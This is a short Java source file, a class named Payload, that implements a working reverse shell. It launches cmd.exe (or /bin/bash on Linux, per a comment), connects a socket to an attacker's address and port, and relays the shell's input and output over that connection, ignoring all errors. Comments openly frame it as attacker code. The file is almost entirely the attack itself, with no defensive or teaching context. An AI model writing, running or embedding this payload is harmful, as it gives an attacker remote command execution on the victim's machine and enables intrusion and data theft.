import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;



public class Payload {


    public static void Run() {

        try {

            // IP address or hostname of attacker
            String attacker = "127.0.0.1";
            int port = 8888;
            // For a windows target do this. For linux "/bin/bash"
            String cmd = "cmd.exe";
            // The rest creates a new process
            // Establishes a socket to the attacker
            // Then redirects the stdin, stdout and stderr to the port.
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(attacker, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            // read all input and output forever.
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            };
            p.destroy();
            s.close();
        } catch (Exception ex) {
            // Ignore errors as we are doing naughty things anyway.
        }

    }
}

